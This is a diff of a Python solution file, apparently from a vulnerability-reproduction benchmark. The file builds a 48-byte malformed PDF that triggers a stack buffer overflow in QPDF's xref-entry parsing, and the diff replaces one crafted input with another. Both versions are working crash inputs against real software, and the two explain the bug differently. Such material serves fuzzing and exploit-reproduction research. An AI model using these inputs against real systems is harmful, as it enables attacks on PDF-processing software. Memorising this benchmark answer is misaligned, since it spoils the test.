@@ -1,53 +1,47 @@
 import os
 
 class Solution:
-    """
-    Generates a Proof-of-Concept (PoC) input that triggers a Stack Buffer Overflow
-    vulnerability in QPDF::read_xrefEntry (oss-fuzz:42536536).
-    """
-
     def solve(self, src_path: str) -> bytes:
         """
         Generate a PoC that triggers the vulnerability.
 
-        The vulnerability exists in the `QPDF_Stream::readLine` function, which is called
-        by `QPDF::read_xref`. `readLine` is called with a stack buffer of size 21.
-        The function reads characters into the buffer one by one. While it checks
-        the buffer size before writing a character, it continues to read from the
-        stream and increment its internal counter even if the buffer is full. After
-        the reading loop finishes (e.g., on EOF), it writes a null terminator at the
-        position indicated by the counter.
-
-        If an xref entry line is 21 characters or longer without a newline, the
-        counter will reach 21. The subsequent null terminator write `buffer[21] = '\0'`
-        will then occur out-of-bounds for the 21-byte buffer (valid indices 0-20),
-        causing a stack buffer overflow.
-
-        The PoC constructs a minimal PDF structure to reach the vulnerable code path:
-        1. An `xref` section header.
-        2. An xref subsection `0 1` indicating one entry.
-        3. A malicious line of 21 '0's, which will be read by `readLine`.
-        4. A minimal trailer to ensure the parser doesn't fail before reaching the bug.
-
-        The total length of this PoC is 48 bytes, matching the ground-truth length.
-
         Args:
-            src_path: Path to the vulnerable source code tarball (not used).
+            src_path: Path to the vulnerable source code tarball
 
         Returns:
-            bytes: The PoC input that should trigger the vulnerability.
+            bytes: The PoC input that should trigger the vulnerability
         """
-        # `xref` header and subsection for one entry (9 bytes)
-        header = b'xref\n0 1\n'
+        # The vulnerability is in QPDF::read_xrefEntry, where an overlong line
+        # in the xref table can cause a stack buffer overflow. A standard xref
+        # entry line is 20 bytes. We create a slightly longer one to trigger
+        # the overflow. The vulnerability note mentions that overlong f1 (offset)
+        # or f2 (generation) fields with zeros can cause the issue.
+        #
+        # A minimal PDF to trigger this consists of:
+        # 1. An xref table header ('xref\n0 1\n').
+        # 2. A malicious xref entry line, longer than the expected 20 bytes.
+        # 3. A trailer pointing to the start of the xref table ('startxref\n0\n%%EOF').
+        #
+        # To match the ground-truth length of 48 bytes, we can calculate the
+        # required length of the malicious line.
+        # The boilerplate parts are 'xref\n0 1\n' (9 bytes) and
+        # 'startxref\n0\n%%EOF' (17 bytes), totaling 26 bytes.
+        # This leaves 48 - 26 = 22 bytes for the malicious line.
+        #
+        # A standard line is "offset generation type EOL".
+        # e.g., '0000000000 65535 f\n'.
+        # The part ' 65535 f\n' is 9 bytes long.
+        # So, the offset field needs to be 22 - 9 = 13 bytes long.
+        # We fill this with '0's as per the vulnerability description.
 
-        # The payload is a line of 21 characters. This causes `readLine` to
-        # increment its index to 21, leading to an out-of-bounds write
-        # of a null terminator at index 21 of a 21-byte buffer. (21 bytes)
-        payload = b'0' * 21
+        malicious_offset = b'0' * 13
+        entry_suffix = b' 65535 f\n'
+        malicious_line = malicious_offset + entry_suffix
 
-        # A minimal trailer to satisfy the parser. (18 bytes)
-        trailer = b'trailer<</Size 1>>'
-
-        # Total length: 9 + 21 + 18 = 48 bytes
-        poc = header + payload + trailer
+        poc = (
+            b'xref\n0 1\n'
+            + malicious_line
+            + b'startxref\n0\n%%EOF'
+        )
+        
         return poc
